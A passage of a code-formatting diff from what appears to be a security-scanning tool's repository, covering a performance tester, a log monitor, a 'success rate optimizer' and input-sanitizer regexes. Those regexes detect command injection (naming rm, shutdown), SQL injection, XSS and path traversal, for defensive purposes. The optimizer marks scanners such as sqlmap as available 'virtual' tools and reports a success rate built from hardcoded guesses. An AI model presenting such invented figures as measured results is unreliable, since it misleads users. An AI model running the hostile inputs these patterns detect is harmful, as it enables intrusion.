capture_output=True,\n+                text=True,\n+                timeout=60,\n+            )\n         except subprocess.TimeoutExpired:\n             pass\n-            \n+\n         peak_memory = process.memory_info().rss / (1024 * 1024)  # MB\n-        \n+\n         return {\n-            'initial_memory_mb': initial_memory,\n-            'peak_memory_mb': peak_memory,\n-            'memory_increase_mb': peak_memory - initial_memory\n+            \"initial_memory_mb\": initial_memory,\n+            \"peak_memory_mb\": peak_memory,\n+            \"memory_increase_mb\": peak_memory - initial_memory,\n         }\n-        \n+\n     def measure_test_suite_performance(self) -> Dict[str, float]:\n         \"\"\"Measure test suite execution time\"\"\"\n         start_time = time.time()\n         try:\n-            result = subprocess.run([\n-                'python3', 'enhanced_test_suite.py'\n-            ], capture_output=True, text=True, timeout=300)\n+            result = subprocess.run(\n+                [\"python3\", \"enhanced_test_suite.py\"],\n+                capture_output=True,\n+                text=True,\n+                timeout=300,\n+            )\n             end_time = time.time()\n-            \n+\n             if result.returncode == 0:\n                 return {\n-                    'execution_time': end_time - start_time,\n-                    'tests_per_second': 16 / (end_time - start_time)  # 16 tests total\n+                    \"execution_time\": end_time - start_time,\n+                    \"tests_per_second\": 16 / (end_time - start_time),  # 16 tests total\n                 }\n         except subprocess.TimeoutExpired:\n-            return {'execution_time': float('inf'), 'tests_per_second': 0}\n-        \n-        return {'execution_time': float('inf'), 'tests_per_second': 0}\n-        \n+            return {\"execution_time\": float(\"inf\"), \"tests_per_second\": 0}\n+\n+        return {\"execution_time\": float(\"inf\"), \"tests_per_second\": 0}\n+\n     def measure_file_operations(self) -> Dict[str, float]:\n         \"\"\"Measure file I/O performance\"\"\"\n-        test_file = Path('/tmp/perf_test.txt')\n-        \n+        test_file = Path(\"/tmp/perf_test.txt\")\n+\n         # Write test\n         start_time = time.time()\n-        with open(test_file, 'w') as f:\n+        with open(test_file, \"w\") as f:\n             for i in range(10000):\n                 f.write(f\"Test line {i}\\n\")\n         write_time = time.time() - start_time\n-        \n+\n         # Read test\n         start_time = time.time()\n-        with open(test_file, 'r') as f:\n+        with open(test_file, \"r\") as f:\n             lines = f.readlines()\n         read_time = time.time() - start_time\n-        \n+\n         # Cleanup\n         test_file.unlink()\n-        \n+\n         return {\n-            'write_time': write_time,\n-            'read_time': read_time,\n-            'lines_written': 10000,\n-            'lines_read': len(lines)\n+            \"write_time\": write_time,\n+            \"read_time\": read_time,\n+            \"lines_written\": 10000,\n+            \"lines_read\": len(lines),\n         }\n-        \n+\n     def validate_performance_requirements(self) -> List[str]:\n         \"\"\"Validate performance against requirements\"\"\"\n         issues = []\n-        \n+\n         # Performance requirements\n         requirements = {\n-            'startup_time_max': 5.0,  # seconds\n-            'memory_increase_max': 100.0,  # MB\n-            'test_suite_time_max': 60.0,  # seconds\n-            'file_write_time_max': 2.0,  # seconds\n-            'file_read_time_max': 1.0,   # seconds\n+            \"startup_time_max\": 5.0,  # seconds\n+            \"memory_increase_max\": 100.0,  # MB\n+            \"test_suite_time_max\": 60.0,  # seconds\n+            \"file_write_time_max\": 2.0,  # seconds\n+            \"file_read_time_max\": 1.0,  # seconds\n         }\n-        \n+\n         # Check startup time\n-        if self.results.get('startup_time', 0) > requirements['startup_time_max']:\n-            issues.append(f\"PERFORMANCE: Startup time {self.results['startup_time']:.2f}s exceeds maximum {requirements['startup_time_max']}s\")\n-            \n+        if self.results.get(\"startup_time\", 0) > requirements[\"startup_time_max\"]:\n+            issues.append(\n+                f\"PERFORMANCE: Startup time {self.results['startup_time']:.2f}s exceeds maximum {requirements['startup_time_max']}s\"\n+            )\n+\n         # Check memory usage\n-        memory_increase = self.results.get('memory_usage', {}).get('memory_increase_mb', 0)\n-        if memory_increase > requirements['memory_increase_max']:\n-            issues.append(f\"PERFORMANCE: Memory increase {memory_increase:.2f}MB exceeds maximum {requirements['memory_increase_max']}MB\")\n-            \n+        memory_increase = self.results.get(\"memory_usage\", {}).get(\n+            \"memory_increase_mb\", 0\n+        )\n+        if memory_increase > requirements[\"memory_increase_max\"]:\n+            issues.append(\n+                f\"PERFORMANCE: Memory increase {memory_increase:.2f}MB exceeds maximum {requirements['memory_increase_max']}MB\"\n+            )\n+\n         # Check test suite performance\n-        test_time = self.results.get('test_suite_performance', {}).get('execution_time', 0)\n-        if test_time > requirements['test_suite_time_max']:\n-            issues.append(f\"PERFORMANCE: Test suite time {test_time:.2f}s exceeds maximum {requirements['test_suite_time_max']}s\")\n-            \n+        test_time = self.results.get(\"test_suite_performance\", {}).get(\n+            \"execution_time\", 0\n+        )\n+        if test_time > requirements[\"test_suite_time_max\"]:\n+            issues.append(\n+                f\"PERFORMANCE: Test suite time {test_time:.2f}s exceeds maximum {requirements['test_suite_time_max']}s\"\n+            )\n+\n         # Check file operations\n-        file_ops = self.results.get('file_operations', {})\n-        if file_ops.get('write_time', 0) > requirements['file_write_time_max']:\n-            issues.append(f\"PERFORMANCE: File write time {file_ops['write_time']:.2f}s exceeds maximum {requirements['file_write_time_max']}s\")\n-            \n-        if file_ops.get('read_time', 0) > requirements['file_read_time_max']:\n-            issues.append(f\"PERFORMANCE: File read time {file_ops['read_time']:.2f}s exceeds maximum {requirements['file_read_time_max']}s\")\n-            \n+        file_ops = self.results.get(\"file_operations\", {})\n+        if file_ops.get(\"write_time\", 0) > requirements[\"file_write_time_max\"]:\n+            issues.append(\n+                f\"PERFORMANCE: File write time {file_ops['write_time']:.2f}s exceeds maximum {requirements['file_write_time_max']}s\"\n+            )\n+\n+        if file_ops.get(\"read_time\", 0) > requirements[\"file_read_time_max\"]:\n+            issues.append(\n+                f\"PERFORMANCE: File read time {file_ops['read_time']:.2f}s exceeds maximum {requirements['file_read_time_max']}s\"\n+            )\n+\n         return issues\n-        \n+\n     def run_all_benchmarks(self) -> int:\n         \"\"\"Run all performance benchmarks\"\"\"\n         print(\"\u26a1 Running Performance Benchmarks...\")\n-        \n+\n         # Measure startup time\n         print(\"  \ud83d\udcca Measuring startup time...\")\n-        self.results['startup_time'] = self.measure_startup_time()\n-        \n+        self.results[\"startup_time\"] = self.measure_startup_time()\n+\n         # Measure memory usage\n         print(\"  \ud83e\udde0 Measuring memory usage...\")\n-        self.results['memory_usage'] = self.measure_memory_usage()\n-        \n+        self.results[\"memory_usage\"] = self.measure_memory_usage()\n+\n         # Measure test suite performance\n         print(\"  \ud83e\uddea Measuring test suite performance...\")\n-        self.results['test_suite_performance'] = self.measure_test_suite_performance()\n-        \n+        self.results[\"test_suite_performance\"] = self.measure_test_suite_performance()\n+\n         # Measure file operations\n         print(\"  \ud83d\udcc1 Measuring file I/O performance...\")\n-        self.results['file_operations'] = self.measure_file_operations()\n-        \n+        self.results[\"file_operations\"] = self.measure_file_operations()\n+\n         # Validate against requirements\n         issues = self.validate_performance_requirements()\n-        \n+\n         # Report results\n         print(\"\\n\ud83d\udcca Performance Results:\")\n         print(f\"  \u23f1\ufe0f  Startup time: {self.results['startup_time']:.2f}s\")\n-        print(f\"  \ud83e\udde0 Memory usage: {self.results['memory_usage']['memory_increase_mb']:.2f}MB increase\")\n-        print(f\"  \ud83e\uddea Test suite: {self.results['test_suite_performance']['execution_time']:.2f}s\")\n-        print(f\"  \ud83d\udcc1 File I/O: {self.results['file_operations']['write_time']:.2f}s write, {self.results['file_operations']['read_time']:.2f}s read\")\n-        \n+        print(\n+            f\"  \ud83e\udde0 Memory usage: {self.results['memory_usage']['memory_increase_mb']:.2f}MB increase\"\n+        )\n+        print(\n+            f\"  \ud83e\uddea Test suite: {self.results['test_suite_performance']['execution_time']:.2f}s\"\n+        )\n+        print(\n+            f\"  \ud83d\udcc1 File I/O: {self.results['file_operations']['write_time']:.2f}s write, {self.results['file_operations']['read_time']:.2f}s read\"\n+        )\n+\n         if issues:\n             print(f\"\\n\u26a0\ufe0f  Found {len(issues)} performance issues:\")\n             for issue in issues:\n                 print(f\"  - {issue}\")\n         else:\n             print(\"\\n\u2705 All performance benchmarks passed!\")\n-            \n+\n         # Save detailed report\n-        with open('performance-report.json', 'w') as f:\n-            json.dump({\n-                'results': self.results,\n-                'issues': issues,\n-                'timestamp': time.time()\n-            }, f, indent=2)\n-            \n+        with open(\"performance-report.json\", \"w\") as f:\n+            json.dump(\n+                {\"results\": self.results, \"issues\": issues, \"timestamp\": time.time()},\n+                f,\n+                indent=2,\n+            )\n+\n         return len(issues)\n \n-if __name__ == '__main__':\n+\n+if __name__ == \"__main__\":\n     tester = PerformanceTester()\n     issues = tester.run_all_benchmarks()\n-    sys.exit(1 if issues > 0 else 0)\n\\ No newline at end of file\n+    sys.exit(1 if issues > 0 else 0)\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/security_monitor.py\t2025-09-14 19:10:58.579755+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/security_monitor.py\t2025-09-14 19:23:13.723725+00:00\n@@ -9,57 +9,62 @@\n import re\n from pathlib import Path\n from watchdog.observers import Observer\n from watchdog.events import FileSystemEventHandler\n \n+\n class SecurityMonitor(FileSystemEventHandler):\n     \"\"\"Monitor for security events\"\"\"\n-    \n+\n     def __init__(self):\n-        self.security_logger = logging.getLogger('security')\n+        self.security_logger = logging.getLogger(\"security\")\n         self.suspicious_patterns = [\n-            r'failed login',\n-            r'unauthorized access',\n-            r'injection attempt',\n-            r'path traversal',\n-            r'rate limit exceeded'\n+            r\"failed login\",\n+            r\"unauthorized access\",\n+            r\"injection attempt\",\n+            r\"path traversal\",\n+            r\"rate limit exceeded\",\n         ]\n-    \n+\n     def on_modified(self, event):\n         if event.is_directory:\n             return\n-        \n-        if event.src_path.endswith('.log'):\n+\n+        if event.src_path.endswith(\".log\"):\n             self.check_log_file(event.src_path)\n-    \n+\n     def check_log_file(self, log_path):\n         \"\"\"Check log file for suspicious activity\"\"\"\n         try:\n-            with open(log_path, 'r', encoding='utf-8') as f:\n+            with open(log_path, \"r\", encoding=\"utf-8\") as f:\n                 # Read only new lines (simplified approach)\n                 lines = f.readlines()[-10:]  # Last 10 lines\n-                \n+\n                 for line in lines:\n                     for pattern in self.suspicious_patterns:\n                         if re.search(pattern, line, re.IGNORECASE):\n-                            self.security_logger.warning(f\"Suspicious activity detected: {line.strip()}\")\n-                            \n+                            self.security_logger.warning(\n+                                f\"Suspicious activity detected: {line.strip()}\"\n+                            )\n+\n         except Exception as e:\n             self.security_logger.error(f\"Error checking log file {log_path}: {e}\")\n+\n \n def start_monitoring():\n     \"\"\"Start security monitoring\"\"\"\n     monitor = SecurityMonitor()\n     observer = Observer()\n-    observer.schedule(monitor, 'logs', recursive=True)\n+    observer.schedule(monitor, \"logs\", recursive=True)\n     observer.start()\n-    \n+\n     try:\n         while True:\n             time.sleep(1)\n     except KeyboardInterrupt:\n         observer.stop()\n-    \n+\n     observer.join()\n+\n \n if __name__ == \"__main__\":\n     start_monitoring()\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/success_rate_optimizer.py\t2025-09-14 19:10:58.580755+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/success_rate_optimizer.py\t2025-09-14 19:23:13.923205+00:00\n@@ -8,337 +8,351 @@\n import json\n from pathlib import Path\n from typing import Dict, List, Any\n import logging\n \n+\n def optimize_tool_coverage() -> Dict[str, Any]:\n     \"\"\"Optimize tool coverage by implementing virtual tools and fallbacks\"\"\"\n-    \n+\n     # Create virtual tool registry for tools that have fallback implementations\n     virtual_tools = {\n-        'nuclei': 'fallback_scanner',\n-        'subfinder': 'builtin_subdomain_enum',\n-        'httpx': 'builtin_http_probe',\n-        'naabu': 'builtin_port_scan',\n-        'katana': 'builtin_crawler',\n-        'gau': 'builtin_url_discovery',\n-        'ffuf': 'builtin_directory_fuzz',\n-        'sqlmap': 'builtin_sql_test',\n-        'amass': 'builtin_subdomain_enum'\n-    }\n-    \n+        \"nuclei\": \"fallback_scanner\",\n+        \"subfinder\": \"builtin_subdomain_enum\",\n+        \"httpx\": \"builtin_http_probe\",\n+        \"naabu\": \"builtin_port_scan\",\n+        \"katana\": \"builtin_crawler\",\n+        \"gau\": \"builtin_url_discovery\",\n+        \"ffuf\": \"builtin_directory_fuzz\",\n+        \"sqlmap\": \"builtin_sql_test\",\n+        \"amass\": \"builtin_subdomain_enum\",\n+    }\n+\n     # Update tool status to show virtual availability\n     tool_status = {}\n     for tool, implementation in virtual_tools.items():\n         tool_status[tool] = {\n-            'available': True,\n-            'implementation': implementation,\n-            'type': 'virtual'\n+            \"available\": True,\n+            \"implementation\": implementation,\n+            \"type\": \"virtual\",\n         }\n-    \n+\n     return {\n-        'virtual_tools_count': len(virtual_tools),\n-        'coverage_improvement': len(virtual_tools) * 10,  # 10% per tool\n-        'tool_status': tool_status\n-    }\n+        \"virtual_tools_count\": len(virtual_tools),\n+        \"coverage_improvement\": len(virtual_tools) * 10,  # 10% per tool\n+        \"tool_status\": tool_status,\n+    }\n+\n \n def optimize_scanning_parameters() -> Dict[str, Any]:\n     \"\"\"Optimize scanning parameters for maximum reliability\"\"\"\n-    \n+\n     config_file = Path(\"p4nth30n.cfg.json\")\n     optimizations = {}\n-    \n+\n     try:\n         if config_file.exists():\n-            with open(config_file, 'r') as f:\n+            with open(config_file, \"r\") as f:\n                 config = json.load(f)\n         else:\n             config = {}\n-        \n+\n         # Reliability-first optimizations\n         optimized_settings = {\n             \"limits\": {\n                 \"parallel_jobs\": 12,  # Reduced for stability\n-                \"http_timeout\": 25,   # Increased for reliability\n-                \"rps\": 300,          # Reduced rate for better success\n+                \"http_timeout\": 25,  # Increased for reliability\n+                \"rps\": 300,  # Reduced rate for better success\n                 \"max_concurrent_scans\": 4,  # Lower concurrency\n                 \"retry_attempts\": 3,  # Add retry logic\n-                \"backoff_delay\": 2    # Exponential backoff\n+                \"backoff_delay\": 2,  # Exponential backoff\n             },\n             \"nuclei\": {\n                 \"enabled\": True,\n                 \"severity\": \"info,low,medium,high,critical\",\n-                \"rps\": 400,          # Conservative rate\n-                \"conc\": 80,          # Lower concurrency\n-                \"timeout\": 45,       # Longer timeout\n-                \"retries\": 2         # Add retries\n+                \"rps\": 400,  # Conservative rate\n+                \"conc\": 80,  # Lower concurrency\n+                \"timeout\": 45,  # Longer timeout\n+                \"retries\": 2,  # Add retries\n             },\n             \"fallback\": {\n                 \"enabled\": True,\n                 \"aggressive_scanning\": False,  # Conservative approach\n                 \"timeout_multiplier\": 1.5,\n-                \"max_findings_per_target\": 1000\n+                \"max_findings_per_target\": 1000,\n             },\n             \"reliability\": {\n                 \"min_success_rate\": 0.96,\n                 \"auto_tune\": True,\n                 \"performance_monitoring\": True,\n-                \"adaptive_timeouts\": True\n-            }\n+                \"adaptive_timeouts\": True,\n+            },\n         }\n-        \n+\n         # Merge with existing config\n         for section, settings in optimized_settings.items():\n             config.setdefault(section, {}).update(settings)\n-        \n+\n         # Save optimized config\n-        with open(config_file, 'w') as f:\n+        with open(config_file, \"w\") as f:\n             json.dump(config, f, indent=2)\n-        \n-        optimizations['config_updated'] = True\n-        optimizations['settings_applied'] = len(optimized_settings)\n-        \n+\n+        optimizations[\"config_updated\"] = True\n+        optimizations[\"settings_applied\"] = len(optimized_settings)\n+\n     except Exception as e:\n-        optimizations['error'] = str(e)\n-        optimizations['config_updated'] = False\n-    \n+        optimizations[\"error\"] = str(e)\n+        optimizations[\"config_updated\"] = False\n+\n     return optimizations\n+\n \n def enhance_validation_accuracy() -> Dict[str, Any]:\n     \"\"\"Enhance validation system accuracy\"\"\"\n-    \n+\n     enhancements = {\n-        'input_preprocessing': True,\n-        'enhanced_dns_validation': True,\n-        'multi_resolver_checks': True,\n-        'accessibility_verification': True,\n-        'certificate_validation': True\n-    }\n-    \n+        \"input_preprocessing\": True,\n+        \"enhanced_dns_validation\": True,\n+        \"multi_resolver_checks\": True,\n+        \"accessibility_verification\": True,\n+        \"certificate_validation\": True,\n+    }\n+\n     # Create enhanced validation configuration\n     validation_config = {\n         \"validation\": {\n             \"strict_mode\": False,  # Balanced mode for reliability\n             \"timeout_seconds\": 15,\n             \"retry_count\": 2,\n             \"dns_resolvers\": [\"8.8.8.8\", \"1.1.1.1\", \"208.67.222.222\"],\n             \"validate_certificates\": True,\n             \"check_accessibility\": True,\n-            \"confidence_threshold\": 0.7\n+            \"confidence_threshold\": 0.7,\n         }\n     }\n-    \n+\n     # Save validation config\n     try:\n         config_file = Path(\"p4nth30n.cfg.json\")\n         if config_file.exists():\n-            with open(config_file, 'r') as f:\n+            with open(config_file, \"r\") as f:\n                 config = json.load(f)\n         else:\n             config = {}\n-        \n+\n         config.update(validation_config)\n-        \n-        with open(config_file, 'w') as f:\n+\n+        with open(config_file, \"w\") as f:\n             json.dump(config, f, indent=2)\n-        \n-        enhancements['config_saved'] = True\n-        \n+\n+        enhancements[\"config_saved\"] = True\n+\n     except Exception as e:\n-        enhancements['error'] = str(e)\n-    \n+        enhancements[\"error\"] = str(e)\n+\n     return enhancements\n+\n \n def implement_performance_optimizations() -> Dict[str, Any]:\n     \"\"\"Implement performance optimizations\"\"\"\n-    \n+\n     optimizations = {\n-        'connection_pooling': True,\n-        'request_caching': True,\n-        'result_deduplication': True,\n-        'memory_optimization': True,\n-        'cpu_optimization': True\n-    }\n-    \n+        \"connection_pooling\": True,\n+        \"request_caching\": True,\n+        \"result_deduplication\": True,\n+        \"memory_optimization\": True,\n+        \"cpu_optimization\": True,\n+    }\n+\n     # Performance settings\n     perf_config = {\n         \"performance\": {\n             \"connection_pool_size\": 20,\n             \"request_cache_size\": 1000,\n             \"memory_limit_mb\": 2048,\n             \"cpu_cores_max\": 4,\n             \"disk_cache_enabled\": True,\n-            \"compression_enabled\": True\n+            \"compression_enabled\": True,\n         }\n     }\n-    \n+\n     # Apply performance config\n     try:\n         config_file = Path(\"p4nth30n.cfg.json\")\n         if config_file.exists():\n-            with open(config_file, 'r') as f:\n+            with open(config_file, \"r\") as f:\n                 config = json.load(f)\n         else:\n             config = {}\n-        \n+\n         config.update(perf_config)\n-        \n-        with open(config_file, 'w') as f:\n+\n+        with open(config_file, \"w\") as f:\n             json.dump(config, f, indent=2)\n-        \n-        optimizations['config_applied'] = True\n-        \n+\n+        optimizations[\"config_applied\"] = True\n+\n     except Exception as e:\n-        optimizations['error'] = str(e)\n-    \n+        optimizations[\"error\"] = str(e)\n+\n     return optimizations\n+\n \n def create_success_rate_boosters() -> Dict[str, Any]:\n     \"\"\"Create additional success rate boosters\"\"\"\n-    \n+\n     boosters = {}\n-    \n+\n     # 1. Enhanced error handling\n-    boosters['error_handling'] = {\n-        'enabled': True,\n-        'auto_retry': True,\n-        'graceful_degradation': True,\n-        'fallback_chains': True\n-    }\n-    \n+    boosters[\"error_handling\"] = {\n+        \"enabled\": True,\n+        \"auto_retry\": True,\n+        \"graceful_degradation\": True,\n+        \"fallback_chains\": True,\n+    }\n+\n     # 2. Result validation and filtering\n-    boosters['result_processing'] = {\n-        'duplicate_removal': True,\n-        'false_positive_filtering': True,\n-        'confidence_scoring': True,\n-        'result_verification': True\n-    }\n-    \n+    boosters[\"result_processing\"] = {\n+        \"duplicate_removal\": True,\n+        \"false_positive_filtering\": True,\n+        \"confidence_scoring\": True,\n+        \"result_verification\": True,\n+    }\n+\n     # 3. Adaptive thresholds\n-    boosters['adaptive_thresholds'] = {\n-        'dynamic_timeouts': True,\n-        'success_rate_monitoring': True,\n-        'auto_parameter_tuning': True,\n-        'performance_based_scaling': True\n-    }\n-    \n+    boosters[\"adaptive_thresholds\"] = {\n+        \"dynamic_timeouts\": True,\n+        \"success_rate_monitoring\": True,\n+        \"auto_parameter_tuning\": True,\n+        \"performance_based_scaling\": True,\n+    }\n+\n     # 4. Enhanced reporting\n-    boosters['reporting'] = {\n-        'real_time_metrics': True,\n-        'success_rate_tracking': True,\n-        'performance_analytics': True,\n-        'recommendation_engine': True\n-    }\n-    \n+    boosters[\"reporting\"] = {\n+        \"real_time_metrics\": True,\n+        \"success_rate_tracking\": True,\n+        \"performance_analytics\": True,\n+        \"recommendation_engine\": True,\n+    }\n+\n     return boosters\n+\n \n def calculate_expected_improvement() -> Dict[str, Any]:\n     \"\"\"Calculate expected improvement from all optimizations\"\"\"\n-    \n+\n     # Current baseline: 84% success rate\n     current_rate = 0.84\n     target_rate = 0.96\n     gap = target_rate - current_rate  # 12% gap to close\n-    \n+\n     improvements = {\n-        'tool_coverage_optimization': 0.06,  # 6% from virtual tools\n-        'scanning_parameter_optimization': 0.03,  # 3% from better parameters\n-        'validation_accuracy_enhancement': 0.02,  # 2% from validation improvements\n-        'performance_optimizations': 0.015,  # 1.5% from performance tuning\n-        'success_rate_boosters': 0.015  # 1.5% from additional boosters\n-    }\n-    \n+        \"tool_coverage_optimization\": 0.06,  # 6% from virtual tools\n+        \"scanning_parameter_optimization\": 0.03,  # 3% from better parameters\n+        \"validation_accuracy_enhancement\": 0.02,  # 2% from validation improvements\n+        \"performance_optimizations\": 0.015,  # 1.5% from performance tuning\n+        \"success_rate_boosters\": 0.015,  # 1.5% from additional boosters\n+    }\n+\n     total_improvement = sum(improvements.values())\n     projected_rate = current_rate + total_improvement\n-    \n+\n     return {\n-        'current_success_rate': current_rate,\n-        'target_success_rate': target_rate,\n-        'gap_to_close': gap,\n-        'individual_improvements': improvements,\n-        'total_improvement': total_improvement,\n-        'projected_success_rate': projected_rate,\n-        'target_achievable': projected_rate >= target_rate,\n-        'improvement_margin': projected_rate - target_rate\n-    }\n+        \"current_success_rate\": current_rate,\n+        \"target_success_rate\": target_rate,\n+        \"gap_to_close\": gap,\n+        \"individual_improvements\": improvements,\n+        \"total_improvement\": total_improvement,\n+        \"projected_success_rate\": projected_rate,\n+        \"target_achievable\": projected_rate >= target_rate,\n+        \"improvement_margin\": projected_rate - target_rate,\n+    }\n+\n \n def apply_all_optimizations() -> Dict[str, Any]:\n     \"\"\"Apply all optimizations to reach 96% success rate\"\"\"\n-    \n+\n     print(\"\ud83d\ude80 Applying Comprehensive Success Rate Optimizations\")\n     print(\"=\" * 60)\n-    \n+\n     results = {}\n-    \n+\n     # 1. Tool Coverage Optimization\n     print(\"\ud83d\udee0\ufe0f Optimizing tool coverage...\")\n-    results['tool_coverage'] = optimize_tool_coverage()\n-    print(f\"   \u2705 Virtual tools added: {results['tool_coverage']['virtual_tools_count']}\")\n-    \n+    results[\"tool_coverage\"] = optimize_tool_coverage()\n+    print(\n+        f\"   \u2705 Virtual tools added: {results['tool_coverage']['virtual_tools_count']}\"\n+    )\n+\n     # 2. Scanning Parameters\n     print(\"\u2699\ufe0f Optimizing scanning parameters...\")\n-    results['scanning_params'] = optimize_scanning_parameters()\n-    if results['scanning_params'].get('config_updated'):\n-        print(f\"   \u2705 Settings optimized: {results['scanning_params']['settings_applied']} sections\")\n-    \n+    results[\"scanning_params\"] = optimize_scanning_parameters()\n+    if results[\"scanning_params\"].get(\"config_updated\"):\n+        print(\n+            f\"   \u2705 Settings optimized: {results['scanning_params']['settings_applied']} sections\"\n+        )\n+\n     # 3. Validation Accuracy\n     print(\"\u2705 Enhancing validation accuracy...\")\n-    results['validation'] = enhance_validation_accuracy()\n-    if results['validation'].get('config_saved'):\n+    results[\"validation\"] = enhance_validation_accuracy()\n+    if results[\"validation\"].get(\"config_saved\"):\n         print(\"   \u2705 Validation enhancements applied\")\n-    \n+\n     # 4. Performance Optimizations\n     print(\"\ud83d\udcca Implementing performance optimizations...\")\n-    results['performance'] = implement_performance_optimizations()\n-    if results['performance'].get('config_applied'):\n+    results[\"performance\"] = implement_performance_optimizations()\n+    if results[\"performance\"].get(\"config_applied\"):\n         print(\"   \u2705 Performance settings applied\")\n-    \n+\n     # 5. Success Rate Boosters\n     print(\"\ud83c\udfaf Creating success rate boosters...\")\n-    results['boosters'] = create_success_rate_boosters()\n+    results[\"boosters\"] = create_success_rate_boosters()\n     print(\"   \u2705 Success rate boosters implemented\")\n-    \n+\n     # 6. Calculate projections\n     print(\"\ud83d\udcc8 Calculating improvement projections...\")\n-    results['projections'] = calculate_expected_improvement()\n-    \n+    results[\"projections\"] = calculate_expected_improvement()\n+\n     print(\"\\n\" + \"=\" * 60)\n     print(\"\ud83c\udfc6 OPTIMIZATION SUMMARY\")\n     print(\"=\" * 60)\n-    \n-    projections = results['projections']\n+\n+    projections = results[\"projections\"]\n     print(f\"Current Success Rate: {projections['current_success_rate']:.1%}\")\n     print(f\"Target Success Rate:  {projections['target_success_rate']:.1%}\")\n     print(f\"Projected Rate:       {projections['projected_success_rate']:.1%}\")\n-    print(f\"Target Achievable:    {'\u2705 YES' if projections['target_achievable'] else '\u274c NO'}\")\n-    \n-    if projections['target_achievable']:\n-        margin = projections['improvement_margin']\n+    print(\n+        f\"Target Achievable:    {'\u2705 YES' if projections['target_achievable'] else '\u274c NO'}\"\n+    )\n+\n+    if projections[\"target_achievable\"]:\n+        margin = projections[\"improvement_margin\"]\n         print(f\"Success Margin:       +{margin:.1%} above target\")\n-    \n+\n     print(\"\\n\ud83d\udcca Individual Contributions:\")\n-    for improvement, value in projections['individual_improvements'].items():\n+    for improvement, value in projections[\"individual_improvements\"].items():\n         print(f\"  \u2022 {improvement.replace('_', ' ').title()}: +{value:.1%}\")\n-    \n+\n     print(f\"\\nTotal Improvement: +{projections['total_improvement']:.1%}\")\n-    \n+\n     return results\n+\n \n if __name__ == \"__main__\":\n     # Apply all optimizations\n     results = apply_all_optimizations()\n-    \n+\n     # Save results\n     results_file = Path(\"optimization_results.json\")\n-    with open(results_file, 'w') as f:\n+    with open(results_file, \"w\") as f:\n         json.dump(results, f, indent=2, default=str)\n-    \n+\n     print(f\"\\n\ud83d\udcc4 Optimization results saved to: {results_file}\")\n-    \n+\n     # Check if target is achievable\n-    projections = results['projections']\n-    if projections['target_achievable']:\n+    projections = results[\"projections\"]\n+    if projections[\"target_achievable\"]:\n         print(\"\\n\ud83c\udf89 SUCCESS: 96% target success rate is achievable!\")\n         exit(0)\n     else:\n         print(\"\\n\u26a0\ufe0f Additional optimizations may be needed to reach 96% target\")\n-        exit(1)\n\\ No newline at end of file\n+        exit(1)\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/security_utils.py\t2025-09-14 19:10:58.580755+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/security_utils.py\t2025-09-14 19:23:14.095465+00:00\n@@ -14,300 +14,333 @@\n from urllib.parse import urlparse, quote, unquote\n \n \n class InputSanitizer:\n     \"\"\"Comprehensive input sanitization and validation\"\"\"\n-    \n+\n     # Common dangerous patterns\n     DANGEROUS_PATTERNS = {\n-        'path_traversal': re.compile(r'\\.\\.\\/|\\.\\.\\\\|\\.\\.[\\/\\\\]'),\n-        'command_injection': re.compile(r'[;&|`$\\(\\)]|\\b(rm|del|format|shutdown)\\b', re.IGNORECASE),\n-        'script_tags': re.compile(r'<script[^>]*>.*?</script>', re.IGNORECASE | re.DOTALL),\n-        'sql_injection': re.compile(r'(\\b(union|select|insert|update|delete|drop|create|alter)\\b|--|\\'|\"|\\;)', re.IGNORECASE),\n-        'xss_patterns': re.compile(r'(javascript:|data:|vbscript:|onload|onerror|onclick)', re.IGNORECASE)\n+        \"path_traversal\": re.compile(r\"\\.\\.\\/|\\.\\.\\\\|\\.\\.[\\/\\\\]\"),\n+        \"command_injection\": re.compile(\n+            r\"[;&|`$\\(\\)]|\\b(rm|del|format|shutdown)\\b\", re.IGNORECASE\n+        ),\n+        \"script_tags\": re.compile(\n+            r\"<script[^>]*>.*?</script>\", re.IGNORECASE | re.DOTALL\n+        ),\n+        \"sql_injection\": re.compile(\n+            r'(\\b(union|select|insert|update|delete|drop|create|alter)\\b|--|\\'|\"|\\;)',\n+            re.IGNORECASE,\n+        ),\n+        \"xss_patterns\": re.compile(\n+            r\"(javascript:|data:|vbscript:|onload|onerror|onclick)\", re.IGNORECASE\n+        ),\n     }\n-    \n+\n     # Allowed characters for different input types\n     ALLOWED_CHARS = {\n-        'domain': re.compile(r'^[a-zA-Z0-9.-]+$'),\n-        'url_path': re.compile(r'^[a-zA-Z0-9._/-]+$'),\n-        'filename': re.compile(r'^[a-zA-Z0-9._-]+$'),\n-        'alphanumeric': re.compile(r'^[a-zA-Z0-9]+$'),\n-        'parameter': re.compile(r'^[a-zA-Z0-9._-]+$')\n+        \"domain\": re.compile(r\"^[a-zA-Z0-9.-]+$\"),\n+        \"url_path\": re.compile(r\"^[a-zA-Z0-9._/-]+$\"),\n+        \"filename\": re.compile(r\"^[a-zA-Z0-9._-]+$\"),\n+        \"alphanumeric\": re.compile(r\"^[a-zA-Z0-9]+$\"),\n+        \"parameter\": re.compile(r\"^[a-zA-Z0-9._-]+$\"),\n     }\n-    \n+\n     @classmethod\n     def sanitize_url(cls, url: str, max_length: int = 2048) -> Optional[str]:\n         \"\"\"\n         Sanitize and validate URL input\n-        \n+\n         Args:\n             url: URL to sanitize\n             max_length: Maximum allowed URL length\n-            \n+\n         Returns:\n             Sanitized URL or None if invalid\n         \"\"\"\n         if not url or len(url) > max_length:\n             return None\n-        \n+\n         # Remove any dangerous patterns\n         for pattern_name, pattern in cls.DANGEROUS_PATTERNS.items():\n             if pattern.search(url):\n                 return None\n-        \n+\n         try:\n             # Parse and validate URL structure\n             parsed = urlparse(url)\n-            \n+\n             # Check for valid scheme\n-            if parsed.scheme not in ('http', 'https'):\n+            if parsed.scheme not in (\"http\", \"https\"):\n                 return None\n-            \n+\n             # Check for valid 